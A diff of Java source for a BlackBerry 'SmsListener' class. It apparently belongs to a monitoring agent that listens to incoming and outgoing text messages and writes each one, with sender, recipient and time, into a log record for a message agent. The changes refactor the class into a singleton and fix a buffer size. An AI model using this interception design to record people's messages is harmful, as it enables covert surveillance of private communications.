@@ -12,6 +12,7 @@ import javax.wireless.messaging.MessageConnection;
 import javax.wireless.messaging.TextMessage;
 
 import net.rim.blackberry.api.phone.Phone;
+import net.rim.device.api.system.RuntimeStore;
 import net.rim.device.api.util.DataBuffer;
 import blackberry.agent.MessageAgent;
 import blackberry.log.LogType;
@@ -23,6 +24,7 @@ import blackberry.utils.Utils;
 import blackberry.utils.WChar;
 
 public class SmsListener {
+    
     private static final int SMS_VERSION = 2010050501;
 
     //#ifdef DEBUG
@@ -32,37 +34,54 @@ public class SmsListener {
     MessageConnection smsconn;
     SMSINListener insms;
     SMSOUTListener outsms;
+    Thread inThread;
+    //SMSInOutListener inoutsms;
+
     MessageAgent messageAgent;
 
-    public SmsListener(final MessageAgent messageAgent) {
+    static SmsListener instance;
+
+    private SmsListener() {
+    };
+
+    public void setMessageAgent(final MessageAgent messageAgent) {
         this.messageAgent = messageAgent;
+    }
+
+    public static SmsListener getInstance() {
+        
+        if (instance == null) {
+            SmsListener singleton = new SmsListener();
+                        
+            instance = singleton;
+        }
+
+        return instance;
     }
 
     public final void start() {
         try {
-
             smsconn = (MessageConnection) Connector.open("sms://:0");
 
             //#ifdef DEBUG_TRACE
-            debug.trace("start: SMSINListener");
+            debug.trace("start: SMSInOutListener");
             //#endif
+            //inoutsms = new SMSInOutListener(smsconn, this);
+            outsms = new SMSOUTListener(this);
             insms = new SMSINListener(smsconn, this);
 
-            //#ifdef DEBUG_TRACE
-            debug.trace("start: SMSOUTListener");
-            //#endif
-
-            outsms = new SMSOUTListener(this);
-
         } catch (final IOException e) {
+            //#ifdef DEBUG_ERROR
             debug.error(e);
+            //#endif
         }
-        
-        new Thread(insms).start();
+
+        inThread = new Thread(insms);
+        inThread.start();
+
         try {
             smsconn.setMessageListener(insms);
             smsconn.setMessageListener(outsms);
-            
         } catch (final IOException e) {
             //#ifdef DEBUG_ERROR
             debug.error(e);
@@ -78,7 +97,23 @@ public class SmsListener {
             if (smsconn != null) {
                 smsconn.close();
             }
-        } catch (final IOException e) {
+            if (insms != null) {
+                insms.stop();
+            }
+
+            if (inThread != null) {
+                //#ifdef DEBUG_TRACE
+                debug.trace("stop: joining inThread");
+                //#endif
+
+                inThread.join();
+
+                //#ifdef DEBUG_TRACE
+                debug.trace("stop: joined inThread");
+                //#endif
+            }
+
+        } catch (final Exception e) {
             //#ifdef DEBUG_ERROR
             debug.error(e);
             //#endif
@@ -88,8 +123,7 @@ public class SmsListener {
     }
 
     public void run() {
-      
-        
+
     }
 
     synchronized void saveLog(final javax.wireless.messaging.Message message,
@@ -140,7 +174,8 @@ public class SmsListener {
             final int flags = incoming ? 1 : 0;
 
             DateTime filetime = null;
-            final byte[] additionalData = new byte[20];
+            final int additionalDataLen = 48;
+            final byte[] additionalData = new byte[additionalDataLen];
 
             String from;
             String to;
@@ -165,8 +200,8 @@ public class SmsListener {
             Check.asserts(filetime != null, "saveLog: null filetime");
             //#endif
 
-            final DataBuffer databuffer = new DataBuffer(additionalData, 0, 48,
-                    false);
+            final DataBuffer databuffer = new DataBuffer(additionalData, 0,
+                    additionalDataLen, false);
             databuffer.writeInt(SMS_VERSION);
             databuffer.writeInt(flags);
             databuffer.writeLong(filetime.getFiledate());
@@ -179,7 +214,10 @@ public class SmsListener {
                     + filetime.toString());
             //#endif
 
-            Check.ensures(additionalData.length == 48, "SMS Wrong buffer size: " + additionalData.length);
+            Check.ensures(databuffer.getLength() == additionalDataLen,
+                    "SMS Wrong databuffer size: " + databuffer.getLength());
+            Check.ensures(additionalData.length == additionalDataLen,
+                    "SMS Wrong buffer size: " + additionalData.length);
 
             if (dataMsg != null) {
                 messageAgent
